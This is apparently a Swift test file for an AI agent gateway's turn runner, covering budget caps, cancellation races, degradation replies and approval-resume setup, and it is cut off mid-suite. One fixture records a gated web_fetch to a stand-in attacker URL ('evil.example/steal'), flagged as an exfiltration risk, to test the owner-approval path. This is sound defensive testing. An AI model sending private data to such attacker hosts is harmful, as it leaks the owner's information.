import ClawAgent
import ClawCore
import ClawData
import ClawTestSupport
import ClawWorkspace
import Foundation
import GRDB
import Logging
import Testing

@testable import ClawGateway

/// The suspended-approval expiry window every `TurnRunner` fixture injects; matches the
/// production `AppConfig` default so the commit's `expires_ts` stays realistic under test.
let testApprovalExpirySeconds = 3600

// MARK: - Test doubles

/// Drives `AgentRuntime` to a chosen `TurnResult` by scripting the provider it calls.
actor StubLLMProvider: LLMProvider {
  enum Outcome: Sendable {
    case respond(ChatResponse)
    case fail(ProviderError)
  }

  private let outcome: Outcome
  private(set) var callCount = 0
  private(set) var requests: [ChatRequest] = []

  init(_ outcome: Outcome) { self.outcome = outcome }

  func complete(request: ChatRequest) async throws -> ChatResponse {
    callCount += 1
    requests.append(request)
    switch outcome {
    case .respond(let response): return response
    case .fail(let error): throw error
    }
  }
}

/// Delegates to the real run store but flips the active run to CANCELLED immediately before the
/// assistant commit, modeling `/stop` winning after the provider returned usage.
struct CancellingBeforeAssistantCommitRuns: RunStore {
  let base: RunStoreGRDB
  let sessionId: Int64

  func pickUp(runId: Int64, policyVersion: String?, now: Date) throws(StoreError) -> RunOrigin? {
    try base.pickUp(runId: runId, policyVersion: policyVersion, now: now)
  }

  func commitAssistantTurn(_ turn: AssistantTurn, now: Date) throws(StoreError) -> RunCommitResult {
    _ = try base.cancelActiveRun(sessionId: sessionId, reason: .cancelled, now: now)
    return try base.commitAssistantTurn(turn, now: now)
  }

  func commitDegradedTurn(_ turn: DegradedTurn, now: Date) throws(StoreError) -> RunCommitResult {
    try base.commitDegradedTurn(turn, now: now)
  }

  func failRun(runId: Int64, now: Date) throws(StoreError) {
    try base.failRun(runId: runId, now: now)
  }

  func commitSuspendedTurn(
    runId: Int64,
    sessionId: Int64,
    commit: SuspendedTurnCommit,
    now: Date
  ) throws(StoreError) -> SuspendedCommitReceipt {
    try base.commitSuspendedTurn(runId: runId, sessionId: sessionId, commit: commit, now: now)
  }

  func cancelActiveRun(
    sessionId: Int64,
    reason: CancelReason,
    now: Date
  ) throws(StoreError) -> Int64? {
    try base.cancelActiveRun(sessionId: sessionId, reason: reason, now: now)
  }

  func supersedeSessionRuns(sessionId: Int64, now: Date) throws(StoreError) -> [Int64] {
    try base.supersedeSessionRuns(sessionId: sessionId, now: now)
  }

  func reconcileRunsAtBoot(
    now: Date,
    degradationText: String,
    heartbeatNoticeChatId: Int64?
  ) throws(StoreError) -> [DegradationReply] {
    try base.reconcileRunsAtBoot(
      now: now,
      degradationText: degradationText,
      heartbeatNoticeChatId: heartbeatNoticeChatId
    )
  }

  func runsHealth(now: Date) throws(StoreError) -> RunsHealth {
    try base.runsHealth(now: now)
  }

  func claimApprovedExecution(
    runId: Int64,
    observationMessageId: Int64,
    notResumableObservationContent: String,
    now: Date
  ) throws(StoreError) -> ApprovedExecutionClaim {
    try base.claimApprovedExecution(
      runId: runId,
      observationMessageId: observationMessageId,
      notResumableObservationContent: notResumableObservationContent,
      now: now
    )
  }

  func fillClaimedObservation(
    runId: Int64,
    observationMessageId: Int64,
    fill: ClaimedObservationFill
  ) throws(StoreError) {
    try base.fillClaimedObservation(
      runId: runId,
      observationMessageId: observationMessageId,
      fill: fill
    )
  }

  func applyApprovedMemoryWrite(  // swiftlint:disable:this function_parameter_count
    runId: Int64,
    observationMessageId: Int64,
    item: NewMemoryItem,
    observationContent: String,
    audit: ApprovedExecutionAudit,
    notResumableObservationContent: String,
    now: Date
  ) throws(StoreError) -> ApprovedExecutionClaim {
    try base.applyApprovedMemoryWrite(
      runId: runId,
      observationMessageId: observationMessageId,
      item: item,
      observationContent: observationContent,
      audit: audit,
      notResumableObservationContent: notResumableObservationContent,
      now: now
    )
  }

  func settleClaimedApprovalAtBoot(
    runId: Int64,
    observationMessageId: Int64,
    observationContent: String,
    noticeChatId: Int64,
    noticeText: String,
    now: Date
  ) throws(StoreError) -> ClaimedApprovalBootOutcome {
    try base.settleClaimedApprovalAtBoot(
      runId: runId,
      observationMessageId: observationMessageId,
      observationContent: observationContent,
      noticeChatId: noticeChatId,
      noticeText: noticeText,
      now: now
    )
  }

  func resumeUsage(runId: Int64) throws(StoreError) -> ResumeUsage {
    try base.resumeUsage(runId: runId)
  }

  func runOrigin(runId: Int64) throws(StoreError) -> RunOrigin? {
    try base.runOrigin(runId: runId)
  }

  func openAutoApproveWindow(runId: Int64, now: Date) throws(StoreError) -> Bool {
    try base.openAutoApproveWindow(runId: runId, now: now)
  }

  func isAutoApproveWindowOpen(runId: Int64) throws(StoreError) -> Bool {
    try base.isAutoApproveWindowOpen(runId: runId)
  }

  func failRunStalePolicy(
    runId: Int64,
    sessionId: Int64,
    observationMessageId: Int64,
    observationContent: String,
    now: Date
  ) throws(StoreError) -> Bool {
    try base.failRunStalePolicy(
      runId: runId,
      sessionId: sessionId,
      observationMessageId: observationMessageId,
      observationContent: observationContent,
      now: now
    )
  }

  func resolveDeniedObservation(
    runId: Int64,
    observationMessageId: Int64,
    content: String,
    cancel: CancelReason?,
    now: Date
  ) throws(StoreError) -> RunCommitResult {
    try base.resolveDeniedObservation(
      runId: runId,
      observationMessageId: observationMessageId,
      content: content,
      cancel: cancel,
      now: now
    )
  }
}

/// Delegates to the real run store but flips the active run to CANCELLED immediately before the
/// degradation commit, modeling `/stop` winning after the runtime produced a degradation result.
struct CancellingBeforeDegradedCommitRuns: RunStore {
  let base: RunStoreGRDB
  let sessionId: Int64

  func pickUp(runId: Int64, policyVersion: String?, now: Date) throws(StoreError) -> RunOrigin? {
    try base.pickUp(runId: runId, policyVersion: policyVersion, now: now)
  }

  func commitAssistantTurn(_ turn: AssistantTurn, now: Date) throws(StoreError) -> RunCommitResult {
    try base.commitAssistantTurn(turn, now: now)
  }

  func commitDegradedTurn(_ turn: DegradedTurn, now: Date) throws(StoreError) -> RunCommitResult {
    _ = try base.cancelActiveRun(sessionId: sessionId, reason: .cancelled, now: now)
    return try base.commitDegradedTurn(turn, now: now)
  }

  func failRun(runId: Int64, now: Date) throws(StoreError) {
    try base.failRun(runId: runId, now: now)
  }

  func commitSuspendedTurn(
    runId: Int64,
    sessionId: Int64,
    commit: SuspendedTurnCommit,
    now: Date
  ) throws(StoreError) -> SuspendedCommitReceipt {
    try base.commitSuspendedTurn(runId: runId, sessionId: sessionId, commit: commit, now: now)
  }

  func cancelActiveRun(
    sessionId: Int64,
    reason: CancelReason,
    now: Date
  ) throws(StoreError) -> Int64? {
    try base.cancelActiveRun(sessionId: sessionId, reason: reason, now: now)
  }

  func supersedeSessionRuns(sessionId: Int64, now: Date) throws(StoreError) -> [Int64] {
    try base.supersedeSessionRuns(sessionId: sessionId, now: now)
  }

  func reconcileRunsAtBoot(
    now: Date,
    degradationText: String,
    heartbeatNoticeChatId: Int64?
  ) throws(StoreError) -> [DegradationReply] {
    try base.reconcileRunsAtBoot(
      now: now,
      degradationText: degradationText,
      heartbeatNoticeChatId: heartbeatNoticeChatId
    )
  }

  func runsHealth(now: Date) throws(StoreError) -> RunsHealth {
    try base.runsHealth(now: now)
  }

  func claimApprovedExecution(
    runId: Int64,
    observationMessageId: Int64,
    notResumableObservationContent: String,
    now: Date
  ) throws(StoreError) -> ApprovedExecutionClaim {
    try base.claimApprovedExecution(
      runId: runId,
      observationMessageId: observationMessageId,
      notResumableObservationContent: notResumableObservationContent,
      now: now
    )
  }

  func fillClaimedObservation(
    runId: Int64,
    observationMessageId: Int64,
    fill: ClaimedObservationFill
  ) throws(StoreError) {
    try base.fillClaimedObservation(
      runId: runId,
      observationMessageId: observationMessageId,
      fill: fill
    )
  }

  func applyApprovedMemoryWrite(  // swiftlint:disable:this function_parameter_count
    runId: Int64,
    observationMessageId: Int64,
    item: NewMemoryItem,
    observationContent: String,
    audit: ApprovedExecutionAudit,
    notResumableObservationContent: String,
    now: Date
  ) throws(StoreError) -> ApprovedExecutionClaim {
    try base.applyApprovedMemoryWrite(
      runId: runId,
      observationMessageId: observationMessageId,
      item: item,
      observationContent: observationContent,
      audit: audit,
      notResumableObservationContent: notResumableObservationContent,
      now: now
    )
  }

  func settleClaimedApprovalAtBoot(
    runId: Int64,
    observationMessageId: Int64,
    observationContent: String,
    noticeChatId: Int64,
    noticeText: String,
    now: Date
  ) throws(StoreError) -> ClaimedApprovalBootOutcome {
    try base.settleClaimedApprovalAtBoot(
      runId: runId,
      observationMessageId: observationMessageId,
      observationContent: observationContent,
      noticeChatId: noticeChatId,
      noticeText: noticeText,
      now: now
    )
  }

  func resumeUsage(runId: Int64) throws(StoreError) -> ResumeUsage {
    try base.resumeUsage(runId: runId)
  }

  func runOrigin(runId: Int64) throws(StoreError) -> RunOrigin? {
    try base.runOrigin(runId: runId)
  }

  func openAutoApproveWindow(runId: Int64, now: Date) throws(StoreError) -> Bool {
    try base.openAutoApproveWindow(runId: runId, now: now)
  }

  func isAutoApproveWindowOpen(runId: Int64) throws(StoreError) -> Bool {
    try base.isAutoApproveWindowOpen(runId: runId)
  }

  func failRunStalePolicy(
    runId: Int64,
    sessionId: Int64,
    observationMessageId: Int64,
    observationContent: String,
    now: Date
  ) throws(StoreError) -> Bool {
    try base.failRunStalePolicy(
      runId: runId,
      sessionId: sessionId,
      observationMessageId: observationMessageId,
      observationContent: observationContent,
      now: now
    )
  }

  func resolveDeniedObservation(
    runId: Int64,
    observationMessageId: Int64,
    content: String,
    cancel: CancelReason?,
    now: Date
  ) throws(StoreError) -> RunCommitResult {
    try base.resolveDeniedObservation(
      runId: runId,
      observationMessageId: observationMessageId,
      content: content,
      cancel: cancel,
      now: now
    )
  }
}

/// A `RunStore` whose first write reports a full disk, to exercise the storage-full rethrow.
struct DiskFullRuns: RunStore {
  func pickUp(runId: Int64, policyVersion: String?, now: Date) throws(StoreError) -> RunOrigin? {
    throw StoreError.diskFull
  }
  func commitAssistantTurn(_ turn: AssistantTurn, now: Date) throws(StoreError) -> RunCommitResult {
    .ignored
  }
  func commitDegradedTurn(_ turn: DegradedTurn, now: Date) throws(StoreError) -> RunCommitResult {
    .ignored
  }
  func failRun(runId: Int64, now: Date) throws(StoreError) {}
  func commitSuspendedTurn(
    runId: Int64,
    sessionId: Int64,
    commit: SuspendedTurnCommit,
    now: Date
  ) throws(StoreError) -> SuspendedCommitReceipt {
    throw StoreError.diskFull
  }
  func cancelActiveRun(
    sessionId: Int64,
    reason: CancelReason,
    now: Date
  ) throws(StoreError) -> Int64? { nil }
  func supersedeSessionRuns(sessionId: Int64, now: Date) throws(StoreError) -> [Int64] { [] }
  func reconcileRunsAtBoot(
    now: Date,
    degradationText: String,
    heartbeatNoticeChatId: Int64?
  ) throws(StoreError) -> [DegradationReply] { [] }
  func runsHealth(now: Date) throws(StoreError) -> RunsHealth {
    RunsHealth(
      inFlight: 0,
      oldestRunAgeSeconds: nil,
      lastFailedAt: nil,
      lastSuccessAt: nil,
      consecutiveFailures: 0
    )
  }
  func claimApprovedExecution(
    runId: Int64,
    observationMessageId: Int64,
    notResumableObservationContent: String,
    now: Date
  ) throws(StoreError) -> ApprovedExecutionClaim {
    throw StoreError.diskFull
  }
  func fillClaimedObservation(
    runId: Int64,
    observationMessageId: Int64,
    fill: ClaimedObservationFill
  ) throws(StoreError) {
    throw StoreError.diskFull
  }
  func applyApprovedMemoryWrite(  // swiftlint:disable:this function_parameter_count
    runId: Int64,
    observationMessageId: Int64,
    item: NewMemoryItem,
    observationContent: String,
    audit: ApprovedExecutionAudit,
    notResumableObservationContent: String,
    now: Date
  ) throws(StoreError) -> ApprovedExecutionClaim {
    throw StoreError.diskFull
  }
  func settleClaimedApprovalAtBoot(
    runId: Int64,
    observationMessageId: Int64,
    observationContent: String,
    noticeChatId: Int64,
    noticeText: String,
    now: Date
  ) throws(StoreError) -> ClaimedApprovalBootOutcome {
    throw StoreError.diskFull
  }
  func resumeUsage(runId: Int64) throws(StoreError) -> ResumeUsage {
    throw StoreError.diskFull
  }
  func runOrigin(runId: Int64) throws(StoreError) -> RunOrigin? {
    throw StoreError.diskFull
  }
  func openAutoApproveWindow(runId: Int64, now: Date) throws(StoreError) -> Bool {
    throw StoreError.diskFull
  }
  func isAutoApproveWindowOpen(runId: Int64) throws(StoreError) -> Bool {
    throw StoreError.diskFull
  }
  func failRunStalePolicy(
    runId: Int64,
    sessionId: Int64,
    observationMessageId: Int64,
    observationContent: String,
    now: Date
  ) throws(StoreError) -> Bool {
    throw StoreError.diskFull
  }
  func resolveDeniedObservation(
    runId: Int64,
    observationMessageId: Int64,
    content: String,
    cancel: CancelReason?,
    now: Date
  ) throws(StoreError) -> RunCommitResult {
    throw StoreError.diskFull
  }
}

struct TurnRunnerWorkspace: WorkspaceReading {
  let memoryFile: LoadedFile

  init(memoryFile: LoadedFile = .missing) {
    self.memoryFile = memoryFile
  }

  func load(file: WorkspaceFile, maxGraphemes: Int?) -> LoadedFile {
    file == .memory ? memoryFile : .missing
  }

  func loadDailyLog(day: String, maxGraphemes: Int?) -> LoadedFile {
    .missing
  }

  func scanSkills() -> SkillScanResult {
    SkillScanResult(descriptors: [], warnings: [])
  }
}

struct SnapshotFailingSessionMessages: SessionMessageStore {
  func loadOrCreateSession(sessionKey: String, now: Date) throws(StoreError) -> Int64 { 0 }

  func claimCommandUpdate(
    updateId: Int64,
    sessionKey: String,
    now: Date
  ) throws(StoreError) -> CommandClaim {
    .duplicate
  }

  func findSession(sessionKey: String) throws(StoreError) -> Int64? {
    nil
  }

  func claimAndPersistInbound(_ inbound: InboundMessage) throws(StoreError) -> ClaimResult {
    ClaimResult(
      newlyClaimed: false,
      sessionId: nil,
      messageId: nil,
      runId: nil,
      triggerMessageId: nil
    )
  }

  func loadContextSnapshot(
    sessionId: Int64,
    throughMessageId: Int64,
    limit: Int
  ) throws(StoreError) -> SessionContextSnapshot {
    throw StoreError.unexpected("snapshot read failed")
  }

  func resetWindowAndDetaint(sessionId: Int64, now: Date) throws(StoreError) {}
}

/// Shared `TurnRunner` test fixture, hoisted to file scope (out of `TurnRunnerTests`' body) so the
/// suite's own body stays under the project's type-length gate as its test count grows.
/// File-internal (not `private`) so the sibling `TurnRunnerBudgetTests` reuses it without duplication.
struct Env {
  let runner: TurnRunner
  let queue: DatabaseQueue

  let sessionMessages: SessionMessageStoreGRDB
  let outbox: OutboxStoreGRDB

  let sessionId: Int64
  let chatId: Int64
  let runId: Int64
  let triggerMessageId: Int64

  let imageCache: ImageCache
  let provider: StubLLMProvider
}

private func makeContextBuilder(
  workspace: TurnRunnerWorkspace = TurnRunnerWorkspace(),
  budget: ContextBudget = .default
) throws -> ContextBuilder {
  let queue = try ClawDatabase.makeInMemoryQueue()
  try ClawDatabase.migrate(queue)
  let memory = MemoryStoreGRDB(writer: queue)
  let retriever = RetrieverGRDB(writer: queue)
  return ContextBuilder(
    systemPrompt: SystemPrompt.minimal,
    workspace: workspace,
    memoryStore: memory,
    retriever: retriever,
    budget: budget,
    now: { Date(timeIntervalSince1970: 0) }
  )
}

func makeEnv(
  agentOutcome: StubLLMProvider.Outcome,
  toolDispatcher: (any ToolDispatching)? = nil,
  runs: (any RunStore)? = nil,
  runsFactory: ((DatabaseQueue, Int64) -> any RunStore)? = nil,
  contextBuilder: ContextBuilder? = nil,
  sessionMessagesForRunner: (any SessionMessageStore)? = nil,
  budget: RunBudget = .default,
  breaker: BudgetBreaker? = nil,
  transport: (any TelegramTransport)? = nil,
  now: @escaping @Sendable () -> Date = { Date() }
) throws -> Env {
  let queue = try ClawDatabase.makeInMemoryQueue()
  try ClawDatabase.migrate(queue)

  let sessionMessages = SessionMessageStoreGRDB(writer: queue)
  let usage = UsageStoreGRDB(writer: queue)
  let outbox = OutboxStoreGRDB(writer: queue)
  let audit = AuditLogGRDB(writer: queue)

  // Seed a session + a user message via the real fused claim, so history is realistic.
  let chatId: Int64 = 42
  let claim = try sessionMessages.claimAndPersistInbound(
    InboundMessage(
      updateId: 1,
      sessionKey: SessionKey.telegramDM(chatId: chatId),
      chatId: chatId,
      userId: chatId,
      text: "hi",
      isEdited: false,
      ts: Date()
    )
  )
  let sessionId = try #require(claim.sessionId)
  let runId = try #require(claim.runId)
  let triggerMessageId = try #require(claim.triggerMessageId)

  let builder: ContextBuilder
  if let contextBuilder {
    builder = contextBuilder
  } else {
    builder = try makeContextBuilder()
  }

  let provider = StubLLMProvider(agentOutcome)
  let agent = AgentRuntime(
    roster: makeSingleRouteRoster(provider: provider, wireModel: "gpt-4o"),
    typingIndicator: NoopTyping(),
    draftStreamer: NoopRichDraftStreaming(),
    streamingEnabled: false,
    costResolver: CostResolver(
      priceTable: .empty,
      referenceUSDPerToken: RunBudget.default.referenceUSDPerToken
    ),
    budget: budget,
    toolDispatcher: toolDispatcher,
    usageStore: usage,
    auditLog: audit,
    clock: ContinuousClock()
  )

  let imageCache = ImageCache()
  let runner = TurnRunner(
    sessionMessages: sessionMessagesForRunner ?? sessionMessages,
    runs: runsFactory?(queue, sessionId) ?? runs ?? RunStoreGRDB(writer: queue),
    usageStore: usage,
    audit: audit,
    agent: agent,
    budget: budget,
    contextBuilder: builder,
    imageCache: imageCache,
    notifyOutbox: {},
    breaker: breaker,
    delivery: transport,
    now: now,
    // Inert on purpose: these fixtures never resolve approvals, so no turn may reach a park.
    parker: InertApprovalParker(coordinator: ApprovalCoordinator()),
    approvalExpirySeconds: testApprovalExpirySeconds,
    logger: TestLog.silent
  )

  return Env(
    runner: runner,
    queue: queue,
    sessionMessages: sessionMessages,
    outbox: outbox,
    sessionId: sessionId,
    chatId: chatId,
    runId: runId,
    triggerMessageId: triggerMessageId,
    imageCache: imageCache,
    provider: provider
  )
}

func latestRunState(_ queue: DatabaseQueue) throws -> String? {
  try queue.read { db in
    try String.fetchOne(db, sql: "SELECT state FROM runs ORDER BY id DESC LIMIT 1")
  }
}

/// Drives an `Env`'s run through the real store choreography an approval resume replays — pick up,
/// suspend on a gated fetch, then the owner's approve claiming and filling the observation — and
/// hands back the message id `resume` binds its context to. File-internal so the image-replay suite
/// resumes the same way this one does rather than restating forty lines of setup.
func suspendOnAGatedFetchThenApprove(
  env: Env,
  origin: RunOrigin = .interactive,
  now: Date
) async throws -> Int64 {
  let runs = RunStoreGRDB(writer: env.queue)
  _ = try #require(try runs.pickUp(runId: env.runId, policyVersion: nil, now: now))
  try await env.queue.write { db in
    try db.execute(
      sql: "UPDATE runs SET origin = ? WHERE id = ?",
      arguments: [origin.rawValue, env.runId]
    )
  }

  let receipt = try runs.commitSuspendedTurn(
    runId: env.runId,
    sessionId: env.sessionId,
    commit: SuspendedTurnCommit(
      assistantContent: "",
      toolCallsJSON: #"[{"id":"f1","name":"web_fetch","arguments":"{}"}]"#,
      completedObservations: [],
      pending: PendingToolAction(
        toolCallId: "f1",
        recorded: RecordedToolAction(
          tool: "web_fetch",
          canonicalArgsJSON: #"{"url":"https://evil.example/steal"}"#,
          argsHash: "hash",
          canonicalTarget: "https://evil.example/steal",
          reason: .exfilTrifecta,
          presentation: ToolApprovalPresentation(
            blastRadius: "egress to evil.example",
            contentPreview: nil,
            warnings: []
          )
        )
      ),
      ownerUserId: env.chatId,
      nonce: ApprovalNonce.generate(),
      promptChunks: [],
      setTainted: true,
      setPrivateData: true,
      expiresTs: now.addingTimeInterval(3_600)
    ),
    now: now
  )

  let claim = try runs.claimApprovedExecution(
    runId: env.runId,
    observationMessageId: receipt.observationMessageId,
    notResumableObservationContent: "stopped",
    now: now
  )
  #expect(claim == .committed)
  try runs.fillClaimedObservation(
    runId: env.runId,
    observationMessageId: receipt.observationMessageId,
    fill: ClaimedObservationFill(
      content: "the fetched page body",
      status: .ok,
      setTainted: true,
      setPrivateData: false,
      audit: ApprovedExecutionAudit(
        tool: "web_fetch",
        argsRedacted: #"{"url":"https://evil.example/steal"}"#
      ),
      now: now
    )
  )

  return receipt.observationMessageId
}

private func okResponse(content: String) -> ChatResponse {
  ChatResponse(
    content: content,
    finishReason: "stop",
    usage: ChatUsage(promptTokens: 10, completionTokens: 5, totalTokens: 15),
    costFromProvider: 0.0021
  )
}

@Suite struct TurnRunnerTests {
  @Test func scheduledRunAtTheProactiveCapIsDeniedDMedOnceAndAudited() async throws {
    // given — a scheduled-origin run whose proactive pool already spent 2.50 today
    let transport = RecordingTransport()
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "should never run")),
      breaker: BudgetBreaker(budget: .default),
      transport: transport
    )
    try await env.queue.write { db in
      try db.execute(
        sql: "UPDATE runs SET origin = 'scheduled' WHERE id = ?",
        arguments: [env.runId]
      )
    }
    try UsageStoreGRDB(writer: env.queue).recordUsage(
      ProviderUsage(
        providerCallID: ProviderCallID(rawValue: "call-proactive-seed"),
        runId: env.runId,
        sessionId: env.sessionId,
        model: "m",
        promptTokens: 10,
        completionTokens: 5,
        costUSD: 2.50,
        costSource: .heuristic,
        isEstimated: true,
        ts: Date()
      )
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then — FAILED with the named cap, the model never ran, one owner DM, one audit trip row
    #expect(try latestRunState(env.queue) == "FAILED")
    let pending = try env.outbox.pendingOutbound()
    #expect(pending.first?.payload == Degradation.budget(cap: "proactive per-day spend"))
    #expect(await env.provider.callCount == 0)
    #expect(await transport.sent.map(\.text) == [Degradation.proactiveCapTripped])
    let tripCount = try await env.queue.read { db in
      try Int.fetchOne(
        db,
        sql: """
          SELECT COUNT(*) FROM audit_events
          WHERE action = 'budget_tripped' AND decision = 'proactive_per_day'
          """
      )
    }
    #expect(tripCount == 1)
  }

  @Test func interactiveRunIsUnaffectedByProactiveSpendAtTheSameMoment() async throws {
    // given — the same 2.50 proactive spend, recorded on a DIFFERENT scheduled run
    let env = try makeEnv(agentOutcome: .respond(okResponse(content: "Hello there")))
    let otherClaim = try env.sessionMessages.claimAndPersistInbound(
      InboundMessage(
        updateId: 2,
        sessionKey: SessionKey.telegramDM(chatId: 77),
        chatId: 77,
        userId: 77,
        text: "seed",
        isEdited: false,
        ts: Date()
      )
    )
    let otherRunId = try #require(otherClaim.runId)
    try await env.queue.write { db in
      try db.execute(
        sql: "UPDATE runs SET origin = 'scheduled' WHERE id = ?",
        arguments: [otherRunId]
      )
    }
    try UsageStoreGRDB(writer: env.queue).recordUsage(
      ProviderUsage(
        providerCallID: ProviderCallID(rawValue: "call-other-run-seed"),
        runId: otherRunId,
        sessionId: try #require(otherClaim.sessionId),
        model: "m",
        promptTokens: 10,
        completionTokens: 5,
        costUSD: 2.50,
        costSource: .heuristic,
        isEstimated: true,
        ts: Date()
      )
    )

    // when — the OWNER's interactive run at the same moment
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then — completes normally; the proactive pool binds proactive runs only
    let state = try await env.queue.read { db in
      try String.fetchOne(db, sql: "SELECT state FROM runs WHERE id = ?", arguments: [env.runId])
    }
    #expect(state == "DONE")
  }

  @Test func completedTurnCommitsDoneRunAndEnqueuesOneOutboxRow() async throws {
    // given
    let env = try makeEnv(agentOutcome: .respond(okResponse(content: "Hello there")))

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(try latestRunState(env.queue) == "DONE")
    let persistedAssistantCount = try await env.queue.read { db in
      try Int.fetchOne(
        db,
        sql: "SELECT COUNT(*) FROM messages WHERE run_id = ? AND content = ?",
        arguments: [env.runId, "Hello there"]
      )
    }
    let assistantCount = try #require(persistedAssistantCount)
    #expect(assistantCount == 1)
    let pending = try env.outbox.pendingOutbound()
    #expect(pending.count == 1)
    let firstPending = try #require(pending.first)
    #expect(firstPending.payload == "Hello there")
  }

  @Test func degradedTurnFailsRunAndEnqueuesADegradationReply() async throws {
    // given — a terminal provider error: no usable answer, no usage to debit
    let env = try makeEnv(agentOutcome: .fail(.terminal(status: 400, message: "bad request")))

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(try latestRunState(env.queue) == "FAILED")
    let pending = try env.outbox.pendingOutbound()
    #expect(pending.count == 1)
    let firstPending = try #require(pending.first)
    #expect(firstPending.payload == Degradation.providerUnavailable)
  }

  @Test func visionRefusalEnqueuesCopyNamingTheModelRatherThanAnOutage() async throws {
    // given — the route refused because the configured model cannot look at images
    let env = try makeEnv(agentOutcome: .fail(.visionUnsupported))

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then — the owner is told what to change, not to try again in a moment, and the reply names
    // the one remedy that works without a config edit and a restart
    let pending = try env.outbox.pendingOutbound()
    let firstPending = try #require(pending.first)
    #expect(firstPending.payload == Degradation.visionUnsupported)
    #expect(firstPending.payload != Degradation.providerUnavailable)
    #expect(firstPending.payload.contains("/new"))
    #expect(firstPending.payload.contains("CLAW_LLM_MODEL"))
    #expect(firstPending.payload.contains("CLAW_IMAGE_INPUT"))
  }

  @Test func diskFullDuringCommitIsRethrownForTheStorageFullPath() async throws {
    // given — the run's first write reports a full disk
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "ignored")),
      runs: DiskFullRuns()
    )

    // when / then — only StoreError.diskFull may propagate out of run
    await #expect(throws: StoreError.diskFull) {
      try await env.runner.run(
        runId: env.runId,
        sessionId: env.sessionId,
        chatId: env.chatId,
        triggerMessageId: env.triggerMessageId
      )
    }
  }

  @Test func supersededRunSelfAbortsBeforeProviderCall() async throws {
    // given
    let env = try makeEnv(agentOutcome: .respond(okResponse(content: "should not run")))
    _ = try RunStoreGRDB(writer: env.queue).supersedeSessionRuns(
      sessionId: env.sessionId,
      now: Date()
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(await env.provider.callCount == 0)
    #expect(try latestRunState(env.queue) == RunState.superseded.rawValue)
    #expect(try env.outbox.pendingOutbound().isEmpty)
  }

  @Test func completedUsageSurvivesWhenStopWinsBeforeAssistantCommit() async throws {
    // given
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "must not send")),
      runsFactory: { queue, sessionId in
        CancellingBeforeAssistantCommitRuns(
          base: RunStoreGRDB(writer: queue),
          sessionId: sessionId
        )
      }
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    let state = try #require(
      try await env.queue.read { db in
        try String.fetchOne(db, sql: "SELECT state FROM runs WHERE id = ?", arguments: [env.runId])
      }
    )
    let usageCount = try #require(
      try await env.queue.read { db in
        try Int.fetchOne(
          db,
          sql: "SELECT COUNT(*) FROM provider_usage WHERE run_id = ?",
          arguments: [env.runId]
        )
      }
    )
    let assistantCount = try #require(
      try await env.queue.read { db in
        try Int.fetchOne(
          db,
          sql: "SELECT COUNT(*) FROM messages WHERE run_id = ? AND role = 'assistant'",
          arguments: [env.runId]
        )
      }
    )
    #expect(state == RunState.cancelled.rawValue)
    #expect(usageCount == 1)
    #expect(assistantCount == 0)
    #expect(try env.outbox.pendingOutbound().isEmpty)
  }

  @Test func degradationReplyIsNotLeftPendingWhenStopWinsBeforeFailCommit() async throws {
    // given
    let raced = try makeEnv(
      agentOutcome: .fail(.terminal(status: 400, message: "bad request")),
      runsFactory: { queue, sessionId in
        CancellingBeforeDegradedCommitRuns(
          base: RunStoreGRDB(writer: queue),
          sessionId: sessionId
        )
      }
    )

    // when
    try await raced.runner.run(
      runId: raced.runId,
      sessionId: raced.sessionId,
      chatId: raced.chatId,
      triggerMessageId: raced.triggerMessageId
    )

    // then
    #expect(try latestRunState(raced.queue) == RunState.cancelled.rawValue)
    #expect(try raced.outbox.pendingOutbound().isEmpty)
  }

  @Test func ownerNoticesArePrefixedToSuccessfulOutboxPayload() async throws {
    // given
    let noticeFile = LoadedFile(outcome: .overCap, text: "", graphemeCount: 2_201)
    let contextBuilder = try makeContextBuilder(
      workspace: TurnRunnerWorkspace(memoryFile: noticeFile)
    )
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "Hello there")),
      contextBuilder: contextBuilder
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    let pending = try env.outbox.pendingOutbound()
    let firstPending = try #require(pending.first)
    #expect(firstPending.payload.contains("`MEMORY.md` is 2201/2200"))
    #expect(firstPending.payload.contains("Hello there"))
    let storedAssistant = try #require(
      try await env.queue.read { db in
        try String.fetchOne(
          db,
          sql: "SELECT content FROM messages WHERE run_id = ? AND role = 'assistant'",
          arguments: [env.runId]
        )
      }
    )
    #expect(storedAssistant == "Hello there")
  }

  @Test func contextBuildFailureFailsRunAndEnqueuesContextDegradation() async throws {
    // given
    let tinyBudget = ContextBudget(
      inputCapGraphemes: 1,
      userFileCap: 1,
      memoryFileCap: 1,
      itemsCap: 1,
      historyCap: 1,
      recallCap: 1,
      skillsCap: 1,
      recallHitCap: 1
    )
    let contextBuilder = try makeContextBuilder(budget: tinyBudget)
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "must not call provider")),
      contextBuilder: contextBuilder
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(await env.provider.callCount == 0)
    #expect(try latestRunState(env.queue) == RunState.failed.rawValue)
    let pending = try env.outbox.pendingOutbound()
    #expect(pending.map(\.payload) == [Degradation.contextUnavailable])
  }

